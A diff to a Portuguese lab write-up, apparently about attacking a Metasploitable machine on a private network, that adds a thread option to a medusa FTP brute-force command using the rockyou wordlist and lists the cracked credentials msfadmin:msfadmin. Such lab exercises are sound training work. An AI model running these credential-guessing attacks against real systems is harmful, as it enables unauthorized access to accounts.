@@ -43,7 +43,7 @@ Ataques Realizados
 
 Comando:
 
-medusa -h 192.168.56.105 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp
+medusa -h 192.168.56.105 -u msfadmin -P /usr/share/wordlists/rockyou.txt -M ftp -t 50
 
 Explicação:
 
@@ -51,6 +51,7 @@ Explicação:
 * `-u`: usuário
 * `-P`: caminho da wordlist
 * `-M`: módulo (FTP)
+* '-t': ativa a opção multithread que torna mais ágil e rapida a execução do comando.
 
 Resultado:
 Credenciais descobertas: `msfadmin:msfadmin`
